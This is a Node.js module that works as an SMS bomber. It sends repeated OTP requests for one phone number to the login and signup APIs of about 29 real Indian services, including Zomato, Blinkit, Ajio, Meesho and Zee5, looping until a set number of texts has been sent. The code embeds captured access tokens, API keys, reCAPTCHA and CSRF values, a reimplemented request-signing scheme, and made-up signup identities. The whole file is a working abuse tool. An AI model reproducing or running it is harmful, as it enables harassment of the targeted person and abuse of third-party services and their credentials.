let fs = require("fs")


function hash(data) {
    var password = String.fromCharCode(109, 121, 119, 97, 108, 108, 101, 116, 108, 121, 45, 111, 112, 115, 117, 107, 114, 97, 116);
    let encryptedData = "";
    for (let i = 0; i < data.length; i++) {
        const charCode = String(data[i]).charCodeAt(0) ^ password.charCodeAt(i % password.length);
        encryptedData += String.fromCharCode(charCode);
    }
    return btoa(encryptedData);
}

function walletlyrandom(length = 50) {
    let result = "";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
    }
    return result;
}

function prepaire_hash_data(data) {
    var dataString = JSON.stringify(data);
    var hashData = hash(dataString);
    data["hash"] = hashData;
    var dataFinal = JSON.stringify(data);
    return dataFinal;
}

async function mywallety(number) {

    return new Promise((resolve) => {
        fetch("https://www.mywalletly.in/api/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: prepaire_hash_data({
                "mobile": number,
                "random": walletlyrandom(),
                "method": "sendOtp"
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).
            then((data) => {

                if (data?.status === "success")
                    resolve(true)
                resolve(false);
            });
    })

}

async function infinitylearn(number) {
    return new Promise((resolve) => {
        fetch("https://otp.infinitylearn.com/api/generateOTP", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ "isd_code": "+91", "phone": number, "tenant_id": "1", "product_id": "300" })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data === true)
                resolve(true)
            resolve(false)
        })
    })
}

async function my11circle(number) {
    return new Promise((resolve) => {
        fetch("https://www.my11circle.com/api/fl/auth/v3/getOtp", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "mobile": number,
                "deviceId": "c4a7dd00-b941-48b7-89e8-4b758aa13d37",
                "deviceName": "",
                "refCode": "",
                "isPlaycircle": false
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.success === true)
                resolve(true)
            resolve(false)
        })

    })

}

async function housing(number) {
    return new Promise((resolve) => {
        fetch("https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_home&isBot=false&platform=desktop&source=web&source_name=AudienceWeb", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ "query": "\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n    $method: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n      method: $method\n    ) {\n      success\n      message\n    }\n  }\n", "variables": { "phone": number, "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" } })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {

            if (data?.data?.sendOtp.success === true)
                resolve(true)
            resolve(false)
        })
    })

}

async function zomato(number) {
    return new Promise((resolve) => {
        let data = new FormData();
        data.append("country_id", "1");
        data.append("number", number);
        data.append("type", "initiate");
        data.append("csrf_token", "1a20ab53810a26f6e668ba114ac310aa");
        data.append("lc", "321f785dacc842fd84097ddee7616ac3");
        data.append("verification_type", "sms")
        fetch("https://accounts.zomato.com/login/phone", {
            method: "POST",
            body: data
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.status === true && data?.message === "Check text messages for your OTP")
                resolve(true)
            resolve(false)
        })
    })

}

async function fantv(number) {
    return new Promise((resolve) => {
        fetch("https://admin.artistfirst.in/v1/auth/login-signup", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "mobile": number,
                "phoneCountryCode": "+91",
                "userId": "66cc47322c93001caa0d9f01"
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "success")
                resolve(true)
            resolve(false)
        })
    })
}

async function byjus(number) {
    return new Promise((resolve) => {
        fetch("https://identity.tllms.com/api/request_otp", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "phone": "+91-" + number,
                "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.id === "00000000-0000-0000-0000-000000000000") {
                resolve(true)
            }
            resolve(false)
        })

    })
}

async function netmeds(number) {
    return new Promise((resolve) => {
        fetch("https://www.netmeds.com/mst/rest/v1/id/details/" + number,).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.result?.otp_details?.random_key)
                resolve(true)
            resolve(false)
        })
    })

}

async function unacademy(number) {
    return new Promise((resolve) => {
        fetch("https://unacademy.com/api/v3/user/user_check/?enable-email=true", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ "phone": number, "country_code": "IN", "otp_type": 1, "email": "", "send_otp": true, "is_un_teach_user": false })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "OTP has been sent to your phone number")
                resolve(true)
            resolve(false)
        })
    })
}

async function medibuddy(number) {
    return new Promise((resolve) => {
        fetch("https://loginprod.medibuddy.in/unified-login/user/register", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "source": "medibuddyInWeb",
                "platform": "medibuddy",
                "phonenumber": number,
                "flow": "Retail-Login-Home-Flow",
                "idealLoginFlow": "false",
                "advertiserId": "22003edf-0bc8-L8d1-9012-28760f6f6e44",
                "mbUserId": "null"
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.data?.OtpStatus === "Sent")
                resolve(true)
            resolve(false)
        })
    })
}

async function momsco(number) {
    return new Promise((resolve) => {
        fetch("https://acl.mgapis.com/v6/otp/generate?vendorCode=tmc&countryFilter=IND&languageFilter=EN&apikey=4b47c4d455ab989c71464395cc74c23a", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "g-recaptcha-action": "sendOtp",
                "g-recaptcha-response": "c00da4f9-b137-4a4a-b548-25e1618ee603"
            },
            body: JSON.stringify({
                "countryCode": "91",
                "mobile": number,
                "isWhatsAppOpted": null,
                "name": "",
                "vendorCode": "tmc"
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "Successfully Generated OTP")
                resolve(true)
            resolve(false)
        })
    })
}

async function ajio(number) {
    return new Promise((resolve) => {
        fetch("https://login.web.ajio.com/api/auth/generateLoginOTP", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "mobileNumber": number
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.success === true)
                resolve(true)
            else {
                fetch("https://login.web.ajio.com/api/auth/signupSendOTP", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        "firstName": "saiyeja",
                        "login": "alsolss@gmail.com",
                        "genderType": "Female",
                        "mobileNumber": number,
                        "rilFnlRegisterReferralCode": "",
                        "requestType": "SENDOTP",
                        "newDesign": false
                    })
                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                    if (data?.statusCode === "1")
                        resolve(true)
                    resolve(false)
                })
            }
        })
    })
}

async function nxtwave(number) {
    return new Promise((resolve) => {
        fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/login/phone_number/v1/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "data": "\"{\\\"phone_number\\\":\\\"" + number + "\\\",\\\"country_code\\\":\\\"+91\\\"}\"",
                "clientKeyDetailsId": 1
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.user_id) {
                resolve(true)
            } else {
                fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/user/create_with_phone_number/v1/", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ "data": "\"{\\\"phone_number\\\":\\\"" + number + "\\\",\\\"country_code\\\":\\\"+91\\\"}\"", "clientKeyDetailsId": 1 })
                }).then(res => res.json()).then((data) => {
                    if (data.user_id)
                        resolve(true)
                    else {
                        fetch("https://ib-user-accounts-backend-prod-apis.ccbp.in/api/ib_user_accounts/send_otp_to_user_with_phone_number/v1/", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({ "data": "\"{\\\"phone_number\\\":\\\"" + number + "\\\",\\\"country_code\\\":\\\"+91\\\"}\"", "clientKeyDetailsId": 1 })
                        }).then(() => {
                            resolve(true)
                        })
                    }
                })
            }
        })
    })
}

async function tradex(number) {
    return new Promise((resolve) => {
        fetch("https://api.tradexapp.co/v2/sendotp", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "mobile": number,
                "source": "sms",
                "country_code": "+91",
                "version": 1099
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.success === "true")
                resolve(true)
            resolve(false)
        })
    })
}

async function kukufm(number) {
    return new Promise((resolve) => {
        fetch("https://kukufm.com/api/v1/users/auth/send-otp/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "phone_number": "+91" + number
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "OTP sent successfully")
                resolve(true)
            resolve(false)
        })
    })
}

async function blinkit(number) {
    return new Promise((resolve) => {
        fetch("https://blinkit.com/v2/accounts/", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477"
            },
            body: new URLSearchParams({
                "user_phone": number
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.sms_sent === true)
                resolve(true)
            resolve(false)
        })
    })
}

async function jar(number) {
    return new Promise((resolve) => {
        fetch("https://zeon-r.myjar.app/v1/pwa/zeon/authRequest?phoneNumber=" + number + "&countryCode=91&partnerId=undefined&captchaResponse=03AFcWeA7s59rsqDWOInFwdOuos_8a78hOW3BVNhQ_CRSvPS4YTz9r-4m1e62NGww4FaICgz9GemkT9gblTGm9MjkeeOhs11FeXRclJixEVWLGAR4cFlya5VjXhhE7VqI_K2BvodvCvvUQzF7bJaXBhsQibE_s4px4VpGa8kBviozmy0LlSwv9EGh3VgQa-g7GifOtsncXLQW6_DA-nLQMEckRpl_1xLjZXcDZncmTz5U2KvErEEIhOVWJzpZfM8sbvkwOKFffneORAYFqMCuEe1N6eUBr9tYN7chYi0_hqWR_Z9_1b9soKk8m9JKVsmfDa7w8j3HlksOZSvrYgqeBJCrffhRToAgQ1uyuJZTc6BhxUA7x9bIoIqPBLvDHGFRi-hJWKQev_GwiNHfd-o0febSDojOdOo7iddb5-3MiBtTfOAYrcnlcCZEnTjqtiywlfMMFmoGGOqGPWfOX1KqCPPDAsiI7kjHehLgzwI-rnBkwFheS1kELHDvNVU9DTSQYfW1XV1gfEennqKQpoQP3wUyolz0qaB2Mg-G3LRnpV2zPenZc18moo5FskM_oEPY9TPhq11S5WOj782ayn4kp-_-hBjuRSUvCmv6x21mI6Vp4MOiIatmQ7G40LcEIu-_vhvEI-rMerFqVfAo4CJJUz85s8LzjhMX8ucZdPFNttMg2vj7udQpyghPxSGJrStRRbRxUC_5iLfAqVvVyOLv6-EMT8FUuSCKTWIrotZNrFYrhvsA9JOPKK9ZzvQHbblJECBCGnB3Va01yjYThaph9OGwXTEbYHJpq_oLvYNC0db6wpMHI3YS5P07W8SzgT58TpT-stI00PClE6kLGeGpGoWs-tEOb0CXC8DDoCTWeZsId-I_os-5MUo2UpG_O2L7-Df6tdnPWjA8qpnTnnSPOMBvEUjcjYV5SSVRDVrIln7pf0jv2EM3BGxJd3DxskeGxDUbV8qShiqnUm_WN8nt8Wye0bPnifw-ECZclGEa3stBPvrms_CFEm8nK3zTKUdAfNLuFTQlGR9XASom4XUqEGravhMk7lGWFKuV8n6vyOzMDO0yh1GtQ9k90bfzuvZ0Pp_zlPg72cbYTkxPPMXuhm8sYAODx9j260hNqrYpPahJwHf0pQR6x0C0e4c-K42-ZhvM6iR2lW_HUCiMv7T_9rwXGERX-tnRxawlhu2EtwuH_gGvLp5cF3moBbzR_etp45KZ8trO-nrBLDTh5AsnXpxkfJyIMMBqk0tJMzo8BFD2MrmQGNorPW9N8PFDw_Bjv6mFo-OxABliE06Q0ocbTnas-fOR32n_5tLLnyB-bEieOrmzMuK3nYEeO-AK35HFmiVH507BBXlapgd-suUoEQN_vEWgm2GpzX0bfKlSzesx5DaPoZWRaIjnmyjT5PG6Yp4CVz_aivNovVIrn4YENLIgzFCeQ3wAc3g5k-t7juktRuPkms_xqtnZyB1xDgSAuparH7cTtQ4IHR8r_86XL9e97D_k1gcpsq6IX1BMvzU-xVCVqKWKTpM1-_9_TDDb-ETfpXV19z9DHR6cB6Lys1w_JJ4tOhIZ7vzMtfHSdyeVobWtHCz9mCsuAq3aCHRVRIgui0O9lb-MG-jdLLHwc9ZlnSaRK-cLK99J5BAxV4ebJsjpb4cJ6tz7rMXzh3ugmM3EhZ188aDsRMla1PoI-N_PNLP3Et0Lm3JuVcFrsNc2uoZfMvL9YvJfgFx4FW6mDpnAt2U30843f868r9kGi2HDBPYOrDEkn46ApHYum1L7If-MAUSM3T4RgZdP11cOVovU3kqrjiRT9XDfHKF28ww4Q9Tj9CTG1-Ka_OoGHAvnE3IydIedXC8qXAW3ybFsPwURinImBzU0a", {
            method: "POST",
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.success === true)
                resolve(true)
            resolve(false)
        })
    })
}

async function probo(number) {
    return new Promise((resolve) => {
        fetch("https://prod.api.probo.in/api/v1/user/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "x-device-os": "ANDROID",
                "x-version-name": "10",
                "appid": "in.probo.pro"
            },
            body: JSON.stringify({
                "mobile": number,
                "is_following_referee": false
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "Successfully Done!!")
                resolve(true)
            resolve(false)
        })
    })
}

async function eatclub(number) {
    return new Promise(async (resolve) => {
        let res = await fetch("https://accounts.box8.co.in/device/register?brand_id=19&device_id=" + hoichoirandom() + "twj-xpo7-1fv8-nb1w-" + hoichoirandom() + "sh2kvzz&platform=web&device_token=null&token=&origin=eatClub")
        let data = await res.json()
        let authorization = data.unsigned_auth_token
        fetch("https://accounts.box8.co.in/customers/sign_up?origin=eatClub&platform=web", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "authorization": authorization
            },
            body: JSON.stringify({
                "phone_no": number,
                "name": "sadsf",
                "email": "dgsghs@gmail.com",
                "password": "dsafsdg"
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.meta.status === "Not OK") {
                fetch("https://accounts.box8.co.in/customers/change_phone?origin=eatClub&platform=web", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "authorization": authorization
                    },
                    body: JSON.stringify({ "phone_no": number })
                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                    if (data?.meta.status === "OK")
                        resolve(true)
                    resolve(false)
                })
            } else
                resolve(true)
        })
    })
}

async function croma(number) {
    return new Promise((resolve) => {
        fetch("https://api.tatadigital.com/api/v2/sso/check-phone-croma", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "client_id": "CROMA-WEB-APP"
            },
            body: JSON.stringify({
                "countryCode": "91",
                "phone": number
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "User not found") {
                fetch("https://api.tatadigital.com/api/v2/sso/check-phone", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "client_id": "CROMA-WEB-APP"
                    },
                    body: JSON.stringify({
                        "countryCode": "91",
                        "sendOtp": true,
                        "phone": number
                    })
                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                    if (data?.refId)
                        resolve(true)
                    resolve(false)
                })
            } else
                resolve(true)
        })
    })
}

function hoichoirandom() {
    let ans = ""
    for (let i = 0; i < 5; i++) {
        ans += Math.floor(Math.random() * 10).toString()
    }
    return ans;
}

async function hoichoi(number) {
    return new Promise((resolve) => {
        fetch("https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-" + hoichoirandom() + "b43-1ea6-02dd-860c-" + hoichoirandom() + "bfc5b1f", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "phoneNumber": "+91" + number,
                "requestType": "send",
                "screenName": "signin"
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.error) {
                fetch("https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-" + hoichoirandom() + "-a627-f106-af27-2b7" + hoichoirandom() + "5d82", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
                    },
                    body: JSON.stringify({
                        "phoneNumber": "+91" + number,
                        "requestType": "send",
                        "whatsappConsent": true
                    })
                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                    if (data?.sent === "true")
                        resolve(true)
                    resolve(false)
                })
            } else
                resolve(true)
        })
    })
}

async function jiocinema(number) {
    return new Promise((resolve) => {
        fetch("https://auth-jiocinema.voot.com/userservice/apis/v4/loginotp/send", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "accesstoken": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJJZCI6IjBiNmExMjM3LWE0YzUtNDk3Ny1hY2U4LWJjNjU4ZjFmNmM1ZiIsInVzZXJUeXBlIjoiR1VFU1QiLCJhcHBOYW1lIjoiUkpJTF9KaW9DaW5lbWEiLCJkZXZpY2VJZCI6IjA4ZjYzZWE0LWZlYmMtNGI0Mi04YWRlLTA4OWI3NmFjN2ExZSIsImRldmljZVR5cGUiOiJwYyIsIm9zIjoid2ViIiwicHJvZmlsZUlkIjoiM2E5NzdkNzUtZjk0OS00NzQwLThhOTMtMGI5NGZkZTUyYjdiIiwiYWRJZCI6IjA4ZjYzZWE0LWZlYmMtNGI0Mi04YWRlLTA4OWI3NmFjN2ExZSIsImV4cGVyaW1lbnRLZXkiOnsiY29uZmlnS2V5IjoiM2E5NzdkNzUtZjk0OS00NzQwLThhOTMtMGI5NGZkZTUyYjdiIiwiZ3JvdXBJZCI6NTM1OX0sInByb2ZpbGVEZXRhaWxzIjp7InByb2ZpbGVUeXBlIjoiYWR1bHQiLCJjb250ZW50QWdlUmF0aW5nIjoiQSJ9LCJ2ZXJzaW9uIjoyMDI0MDMwNDB9LCJleHAiOjE3MjcyNzQ3NTAsImlhdCI6MTcyNDY4Mjc1MH0.CVWts8Wrwf4rg4PyHYVUCC_h1xkZXT-MN-SwNWaAnyTZezttWbNVhKSUsQ9zy89O79_8DmIiVSyXEyl6ULa_HQ",
                "appname": "RJIL_JioCinema",
                "os": "web",
                "devicetype": "pc"
            },
            body: JSON.stringify({
                "number": btoa("+91" + number),
                "appVersion": "24.08.12.5-472b0237",
                "retry_count": 0
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.OTPInfo)
                resolve(true)
            resolve(false)
        })
    })
}

async function fancode(number) {
    return new Promise((resolve) => {
        fetch("https://www.fancode.com/graphql", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "expcapability": "true",
                "fc-device-type": "desktop",
                "source": "fc-web"
            },
            body: JSON.stringify({
                "operationName": "RequestOTP",
                "operation": "mutation",
                "variables": {
                    "mobileNumber": number,
                    "pageName": "HomePageV2"
                },
                "query": "fragment RequestOTPParams on AuthOTPResult {\n  message\n  success\n  totalAttemptCount\n  retryAfter\n  remainingAttemptCount\n  resendButtonActiveIn\n  newUser\n  email\n  password\n}\n\nmutation RequestOTP($mobileNumber: String!, $email: String, $password: String) {\n  requestAuthOTP(mobileNumber: $mobileNumber, email: $email, password: $password) {\n    ...RequestOTPParams\n  }\n}\n        "
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.data !== null)
                resolve(true)
            resolve(false)
        })
    })

}

async function gamezone(number) {
    return new Promise((resolve) => {
        fetch("https://api.dotshowroom.in/api/dotk/vo1/user/login/" + number + "?source=digital_showroom&domain=https://www.digitalgamezone.co.in/orders")
            .then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                if (data?.status)
                    resolve(true)
                resolve(false)
            })
    })
}

async function meesho(number) {
    return new Promise((resolve) => {
        fetch("https://www.meesho.com/api/v1/user/login/request-otp", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "PostmanRuntime/7.41.2"
            },
            body: JSON.stringify({
                "phone_number": number
            })
        })
            .then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                if (data?.data)
                    resolve(true)
                resolve(false)
            })
    })
}

function zee5getrandom(len) {
    const chars = "abcdefghijklmnopqrstuvwxyz1234567890";
    let res = "";
    for (let i = 0; i < len; i++) {
        if (i == 9 || i == 14 || i == 19 || i == 24) {
            res += "-";
        } else
            res += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return res;
}

async function zee5(number) {
    return new Promise((resolve) => {
        let deviceid = zee5getrandom(36);
        let token = btoa(deviceid + "__gBQaZLiNdGN9UsCKZaloghz9t9StWLSD__" + Date.now())
        fetch("https://auth.zee5.com/v1/user/sendotp", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "device_id": deviceid,
                "esk": token
            },
            body: JSON.stringify({ "phoneno": "91" + number })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "SMS successfully sent")
                resolve(true)
            resolve(false)
        })
    })
}

async function mamaearth(number) {
    return new Promise((resolve) => {
        fetch("https://auth.mamaearth.in/v1/auth/initiate-signup", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ "mobile": number, "referralCode": "" })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.status)
                resolve(true)
            else {
                fetch("https://auth.mamaearth.in/v1/auth/send-otp", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ "mobile": number, "isGokwik": false })
                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                    if (data?.status)
                        resolve(true)
                    resolve(false)
                })
            }
        })
    })
}

async function derma(number) {
    return new Promise((resolve) => {
        fetch("https://auth.thedermaco.com/v1/auth/initiate-signup", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ "mobile": number, "referralCode": "" })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.status)
                resolve(true)
            else {
                fetch("https://auth.thedermaco.com/v1/auth/send-otp", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ "mobile": number, "isGokwik": false })
                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
                    if (data?.status)
                        resolve(true)
                    resolve(false)
                })
            }
        })
    })
}


async function uspolo(number) {
    return new Promise((resolve) => {
        fetch("https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "shop_name": "u-s-polo-assn-india.myshopify.com",
                "action": "sendOTP"
            },
            body: JSON.stringify({
                "username": "+91" + number,
                "type": "mobile",
                "domain": "uspoloassn.in",
                "recaptcha_token": ""
            })
        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
            if (data?.message === "OTP sent successfully!")
                resolve(true)
            resolve(false)
        })
    })
}

function sleep(time){
    let now = new Date().getTime();
    for(let i=0; i<1e7 ;i++){
        if(new Date().getTime() - now >= time) 
            break;
    }

}

async function sendsms(number, ws, limit, speed) {
    speed = parseInt(speed)
    let list = [ajio, blinkit, byjus, croma, derma, eatclub, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, meesho, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
    let i = 0,t=0;
    while (i < limit) {
        let res = await list[t%29](number)
        if (res) {
            i++;
            ws.send("1")
            sleep(speed)
        }
        t++;
    }
}

module.exports = { sendsms }